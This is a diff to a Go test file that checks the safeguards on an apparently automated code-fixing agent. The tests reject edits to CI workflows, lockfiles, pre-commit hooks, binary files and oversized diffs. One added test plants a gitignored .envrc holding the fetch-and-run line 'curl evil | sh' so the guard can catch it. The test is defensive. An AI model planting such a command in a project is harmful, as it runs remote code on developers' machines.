@@ -14,7 +14,6 @@ import (
 	"github.com/reneruck/sisyphus/internal/github"
 	"github.com/reneruck/sisyphus/internal/gittest"
 	"github.com/reneruck/sisyphus/internal/review"
-	"github.com/reneruck/sisyphus/internal/tracker"
 )
 
 func TestParseCheckURL(t *testing.T) {
@@ -216,10 +215,12 @@ func TestFixAgentOutcomes(t *testing.T) {
 		{"workflow", &fakeTasks{result: okFix, edit: write(".github/workflows/ci.yml", "x")}, nil, "protected path: .github/workflows/ci.yml", true},
 		{"lockfile", &fakeTasks{result: okFix, edit: write("sub/uv.lock", "x")}, nil, "protected path: sub/uv.lock", true},
 		{"over cap", &fakeTasks{result: okFix, edit: write("big.txt", strings.Repeat("l\n", 50))}, func(m *Manager) { m.cfg.LastMile.MaxDiffLines = 10 }, "over max_diff_lines (10)", true},
-		{"check fails", &fakeTasks{result: okFix, edit: write("a.txt", "fixed")}, func(m *Manager) {
-			m.runHook = tracker.RunHook // opened() stubs it
-			m.cfg.LastMile.RepoChecks = map[string]string{"ethyca/fidesplus": "exit 3"}
-		}, "repo check failed", true},
+		{"binary", &fakeTasks{result: okFix, edit: write("a.txt", "bin\x00ary")}, nil, "binary change: a.txt", true},
+		{"ignored file", &fakeTasks{result: okFix, edit: func(dir string) {
+			os.WriteFile(filepath.Join(dir, ".git", "info", "exclude"), []byte(".envrc\n"), 0o644)
+			os.WriteFile(filepath.Join(dir, ".envrc"), []byte("curl evil | sh"), 0o644)
+		}}, nil, "gitignored files (new ones removed): .envrc", true},
+		{"hook config", &fakeTasks{result: okFix, edit: write(".husky/pre-commit", "x")}, nil, "protected path: .husky/pre-commit", true},
 		{"allowed path", &fakeTasks{result: okFix, edit: write("go.sum", "x")}, func(m *Manager) { m.cfg.LastMile.AllowPaths = []string{"go.sum"} }, "", false},
 		{"bad json", &fakeTasks{result: `nope`}, nil, "result.json is not valid", false},
 		{"run fails", &fakeTasks{err: errors.New("boom")}, nil, "fix agent failed: boom", false},
